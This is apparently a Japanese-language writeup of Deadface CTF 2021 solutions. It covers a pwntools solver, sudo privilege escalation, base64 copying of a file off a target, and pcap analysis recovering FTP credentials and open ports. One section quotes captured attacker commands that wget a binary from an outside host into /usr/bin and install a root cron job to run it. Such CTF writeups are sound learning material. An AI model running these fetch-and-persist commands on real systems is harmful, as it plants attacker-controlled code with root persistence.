---
title: "Deadface CTF 2021 Writeup"
date: 2021-10-17T10:00:00+09:00
lastmod: 2021-10-17T10:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdeadface_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://deadface.ctfd.io/challenges](https://deadface.ctfd.io/challenges)
<br /><br />

1380点を獲得し、304位でした。

日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チャレンジがあることに気づきました。もうちょっと早い段階でチャレンジを追加して欲しかったです。。（泣）

<br><br>

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_Score1.png" alt="deadface_CTF_2021_Score1.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_Score2.png" alt="deadface_CTF_2021_Score2.png">

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_Score3.png" alt="deadface_CTF_2021_Score3.png">

<br><br>
チャレンジのリストです。

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_chall1.png" alt="deadface_CTF_2021_chall1.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_chall2.png" alt="deadface_CTF_2021_chall2.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_chall3.png" alt="deadface_CTF_2021_chall3.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_chall4.png" alt="deadface_CTF_2021_chall4.png">

<br>



<br /><br />
## [Programming]: The count (275 points)
- - -
### Challenge
> Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He's placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as flag{SHA256_hash}.
<br /><br />
code.deadface.io:50000

<br />
### Solution
まずは、接続して動作を確認します。

<pre>
$ nc code.deadface.io 50000
DEADFACE gatekeeper: Let us see how good your programming skills are.
If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:

 You have 5 seconds to give me an answer.

Your word is: stem
3
Stop wasting my time.
Connection Closed.
^C

$ nc code.deadface.io 50000
DEADFACE gatekeeper: Let us see how good your programming skills are.
If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:

 You have 5 seconds to give me an answer.

Your word is: tangy
Too slow!! Word has been reset!

</pre>

<br>
Wordが貰えるので、a=0, ... , z=25 として、数値の合計を送り返してください、というチャレンジです。

書いたコードです。

```Python
#!/usr/bin/env python
from pwn import *
import string

s = remote('code.deadface.io', 50000)

s.recvuntil(b'Your word is: ')
word = s.recvuntil(b'\n')
word = word.decode('utf-8')
word = word[:-1]
print(word)

sum = 0
for i in word:
    sum += string.ascii_lowercase.index(i)
s.sendline(bytes(str(sum), 'utf-8'))
msg = s.recvuntil(b'}')
print(msg.decode('utf-8')
```

<br />

実行結果：

<pre>
$ ./The_Count_solve.py
[+] Opening connection to code.deadface.io on port 50000: Done
bless

flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}
[*] Closed connection to code.deadface.io port 50000

</pre>


<br />

Flag: `flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}`


<br /><br />
<br /><br />
## [Forensics]: Blood Bash (10 points)
- - -
### Challenge
> We've obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.
<br /><br />
bloodbash.deadface.io:22
<br /><br />
(credentialは省略します)

<br />
### Solution
flag1.txtを見つけて、中身を確認します。

<pre>
bl0ody_mary@ff4c010e4713:~$ find . -name 'flag1.txt'
./Documents/flag1.txt

bl0ody_mary@ff4c010e4713:~$ cat ./Documents/flag1.txt
flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}
</pre>

<br>

Flag: `flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}`



<br /><br />
<br /><br />
## [Forensics]: Blood Bash 2 (15 points)
- - -
### Challenge
> We've obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.

<br />
### Solution
ホームディレクトリ配下のファイルの一覧より、怪しいテキストファイルを見つけて開きます。

<pre>
bl0ody_mary@ff4c010e4713:~$ find .
.
./De Monne Customer Portal.pdf
./.bash_history
./Videos
./.bash_logout
./.profile
./Downloads
./.bashrc
./Music
./Documents
./Documents/flag1.txt
./Documents/.demonne_info.txt
./Pictures

bl0ody_mary@e71c74c90745:~$ cat ./Documents/.demonne_info.txt
flag{a856b162978fe563537c6890cb184c48fc2a018a}
</pre>

<br>

Flag: `flag{a856b162978fe563537c6890cb184c48fc2a018a}`



<br /><br />
<br /><br />
## [Forensics]: Blood Bash 3 (100 points)
- - -
### Challenge
> There's a flag on this system that we're having difficulty with. Unlike the previous flags, we can't seem to find a file with this flag in it. Perhaps the flag isn't stored in a traditional file?

<br />
### Solution
`sudo -l`を見ると、いくつかsudoで実行できるファイルがあります。`sudo /opt/start.sh` で root になれます。

<pre>
bl0ody_mary@e71c74c90745:~$ sudo -l
Matching Defaults entries for bl0ody_mary on e71c74c90745:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bl0ody_mary may run the following commands on e71c74c90745:
    (ALL) NOPASSWD: /opt/start.sh, /usr/sbin/srv

bl0ody_mary@e71c74c90745:~$ sudo /opt/start.sh
root@e71c74c90745:/home/bl0ody_mary# Traceback (most recent call last):
  File "/usr/sbin/srv", line 14, in <module>
    udp_server_socket.bind((host, port))
OSError: [Errno 98] Address already in use

root@e71c74c90745:/home/bl0ody_mary# id
uid=0(root) gid=0(root) groups=0(root)

</pre>

<br>

フラグは、/usr/sbin/srv の方にありました。

<pre>
root@e71c74c90745:~# cat /usr/sbin/srv
#!/usr/bin/env python3

import socket as s
from binascii import hexlify as h, unhexlify as u

host = "127.0.0.1"
port = 43526
buffer = 1024

msg = b"666c61677b6f70656e5f706f727428616c29737d"
bytes_to_send = u(msg)

udp_server_socket = s.socket(s.AF_INET, s.SOCK_DGRAM)
udp_server_socket.bind((host, port))

while True:
        bytes_address_pair = udp_server_socket.recvfrom(buffer)
        #message = bytes_address_pair[0]
        address = bytes_address_pair[1]

        udp_server_socket.sendto(bytes_to_send, address)

</pre>

<br>

Flag: `flag{open_port(al)s}`



<br /><br />
<br /><br />
## [Forensics]: Blood Bash 4 (200 points)
- - -
### Challenge
> A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they're creating for their consumers. Read the contents of the file and return the flag as flag{flag_goes_here}.

<br />
### Solution
ホームディレクトリにある pdf を取得して開きます。ただし、scpで取ってこようとしたらエラーになりました。

<pre>
$ scp -r bl0ody_mary@bloodbash.deadface.io:~/*.pdf .
bl0ody_mary@bloodbash.deadface.io's password:
the input device is not a TTY

</pre>

<br>

代替手段として、base64を使って取得しました。

<pre>
bl0ody_mary@e71c74c90745:~$ cat *.pdf | base64
JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
:
(snip)
:
</pre>

<br>

自分のPCでbase64デコードして、De_Monne_Customer_Portal.pdf を開くとフラグが得られます。

<br>

Flag: `flag{deM0nn3_dat4_4_us}`


<br /><br />
<br /><br />
## [Traffic Analysis]: Monstrum ex Machina (30 points)
- - -
### Challenge
> Our person on the "inside" of Ghost Town was able to plant a packet sniffing device on Luciafer's computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.
<br /><br />
We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.
<br /><br />
To gather some information on the victim, investigate the victim's computer activity. The "victim" was using a search engine to look up a name. Provide the name with standard capitalization: flag{Jerry Seinfeld}.
<br /><br />

Attachment:

- pcap-challenge-final.pcapng

<br />
### Solution
`search engine` ということなので、httpと仮定して、`tcp.port==80` でフィルターして別ファイルとして保存しておきます。パケット数が多いとwiresharkでの操作が遅くなるからです。

とりあえず、`strings` コマンドを使って `name` という文字列をサーチしてみたら、人の名前（%22charles%20geschickter）が見つかったので試してみたらフラグとして通りました。

<pre>
$ strings pcap-challenge-final_port80.pcapng | grep -i name
GET /v.gif?pid=201&pj=www&pj_name=es_sug&es_sug_hot=0&es_sug_num=5&eb_sug_num=0&es_sug_bp=2_0&path=http%3A%2F%2Fwww.baidu.com%2F&wd=&rsv_sid=34436_34378_34403_33848_34072_34092_34458_26350_34415_34390&rsv_did=486bf8cc017242155b84e0df5ac12c69&t=1629672402611 HTTP/1.1
GET /link?url=PyCSdWIlXVqvjbY7rfVdNBXREuuPR4iOO4DxDZJUEDlXeMgseB3nAoPT2WWy8pFZDo6ygl0jRUpdwLEc-iTiM_&query=mk%20ultra&cb=jQuery110205459770924432298_1629672401231&data_name=recommend_common_merger_online&ie=utf-8&oe=utf-8&format=json&t=1629672412000&_=1629672401244 HTTP/1.1
GET /link?url=gtV7J1j1xY_cNHtP_SDywFtzWxKNScoPryi0x605iwwQ9l6odRnh7yUnWO2DBxYiugkXHyNkjR4s62pO_7DUmK&query=%22charles%20geschickter%22&cb=jQuery110205459770924432298_1629672401231&data_name=recommend_common_merger_online&ie=utf-8&oe=utf-8&format=json&t=1629672447000&_=1629672401269 HTTP/1.1
:
(snip)
:
</pre>

<br>

Flag: `flag{Charles Geschickter}`



<br /><br />
<br /><br />
## [Traffic Analysis]: The SUM of All FEARS (50 points)
- - -
### Challenge
> After hacking a victim's computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).
<br /><br />
What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}

<br />
### Solution
ftp通信の中で、lytton-crypt.bin と lytton-crypt.exe を見つけました。`two binaries with identical names` ということで、これらですね。

このftp通信も一旦 display filter `ftp` でフィルターした後に別ファイルとして保存したんですが、Control port しか保存されないので、別途 Data port も見つけないといけません。

<pre>
227 Entering Passive Mode (192,168,100,103,193,241).
RETR /TOOLS/lytton-crypt.bin
125 Data connection already open; Transfer starting.
226 Transfer complete.
:
227 Entering Passive Mode (192,168,100,103,193,243).
RETR /TOOLS/lytton-crypt.exe
125 Data connection already open; Transfer starting.
226 Transfer complete.
:
</pre>

<br>

Passive Mode における Data port のポート番号は以下のように求めることができます。

<pre>
$ ruby -e 'puts 193 * 256 + 243'
49651

$ ruby -e 'puts 193 * 256 + 241'
49649
</pre>

<br>

元のpcapに戻って、それぞれ `tcp.port==49651`、`tcp.port==49649` で tcp streamを出して、`RAW`で表示しファイルとして保存すると、ファイルがバイナリで保存できます。

あとは、md5を求めるだけです。

<br>

Flag: `flag{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}`




<br /><br />
<br /><br />
## [Traffic Analysis]: Release the Crackin'! (50 points)
- - -
### Challenge
> Luciafer cracked a password belonging to the victim. Submit the flag as: flag{password}.

<br />
### Solution
Victimは `Charles` なので、Charlesのパスワードを探します。これは、ftp通信の中で出てきます。

<pre>
USER cgeschickter
331 Password required
PASS darkangel
230 User logged in.
</pre>

<br>

Flag: `darkangel`



<br /><br />
<br /><br />
## [Traffic Analysis]: Scanners (100 points)
- - -
### Challenge
> Luciafer started the hack of the Lytton Labs victim by performing a port scan.
<br /><br />
Which TCP ports are open on the victim's machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers >= 16384.
<br /><br />
Example: flag{80,110,111,143,443,2049}

<br />
### Solution
WiresharkでConversationを見てみると、192.168.100.106 (client) と 192.168.100.103 (server) の間で 70000 くらいのtcp connectionがあるので、ここで full port scan をしていることがわかります。

Display filter `tcp and ip.addr==192.168.100.103` で、これも別ファイルに保存しておきます。

再度 Coversation で見てみて、Packets のカラムでソートし、とりあえず Packets の数が2以下は除外しました。

残りのデータはcsvで保存し、ポート番号でソートしました。

<pre>
$ cat tcp_103.csv | cut -d, -f4 | sort -un
21
135
139
445
3389
5070
7466
9112
10896
12757
12803
15406
16052
16326
:
</pre>

<br>

あとは、さらっと目視で確認して、openになっているポートを確認しました。

<br>

Flag: `flag{21,135,139,445,3389}`




<br /><br />
<br /><br />
## [Traffic Analysis]: Luciafer, You Clever Little Devil! (50 points)
- - -
### Challenge
> Luciafer gains access to the victim's computer by using the cracked password. What is the packet number of the response by the victim's system, saying that access is granted? Submit the flag as: flag{#}.

<br />
### Solution
これも、ftpの通信です。ログインが成功した箇所のFrame番号を答える問題です。

以下のように2回出てきますが、1回目は Brute Force をやった結果ログインが成功したところ、2回目が実際にLuciaferがログインしたところです。

<pre>
Frame #159602 Request: PASS darkangel
Frame #159603 Response: 230 User Logged in.

Frame #159764 Request: PASS darkangel
Frame #159765 Response: 230 User Logged in.
</pre>

<br>

Flag: `flag{159765}`




<br /><br />
<br /><br />
## [Traffic Analysis]: A Warning (150 points)
- - -
### Challenge
> Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.
<br /><br />
One of them says: "Stay away from Lytton Labs... you have been warned."
<br /><br />
To find the flag, find the message. You'll know it when you see it. Submit the flag as flag{flag-goes-here}.

<br />
### Solution
Warning を da-warning-message.jpg という画像を使って表示するようになっているっぽいです。

httpからファイルをexportして開いてみると、フラグが書かれていました。

<br>

Flag: `flag{angels-fear-to-tread}`



<br /><br />
<br /><br />
## [Traffic Analysis]: Luciafer's Fatal Error (50 points)
- - -
### Challenge
> Luciafer, consummate hacker, got cocky and careless. She made a fatal mistake, and in doing so, gave control of her computer to... someone. She ran a program on her computer that she shouldn't have.

<br />
### Solution
イベントが終了してから気づいた追加チャレンジです。

secret_decoder.bin というのを http でダウンロードし、ll-connect.bin という名前で保存しています。

<pre>
sudo wget -O /usr/bin/ll-connect.bin http://192.168.100.105/secret_decoder.bin
--2021-08-22 17:55:35--  http://192.168.100.105/secret_decoder.bin
Connecting to 192.168.100.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: '/usr/bin/ll-connect.bin'

sudo chmod 755 /usr/bin/ll-connect.bin
sudo /bin/bash -c "echo '*/5 * * * * root /usr/bin/ll-connect.bin' > /etc/cron.d/da-ll-backup-job"

cat /etc/cron.d/da-ll-backup-job
*/5 * * * * root /usr/bin/ll-connect.bin

</pre>

Wiresharkから、http通信の中のファイルをexportします。Content-Type: application/octet-stream のやつを探すと見つかりやすいです。

<br>

<pre>
$ md5sum secret_decoder.bin
42e419a6391ca79dc44d7dcef1efc83b  secret_decoder.bin
</pre>

<br>

Flag: `flag{42e419a6391ca79dc44d7dcef1efc83b}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
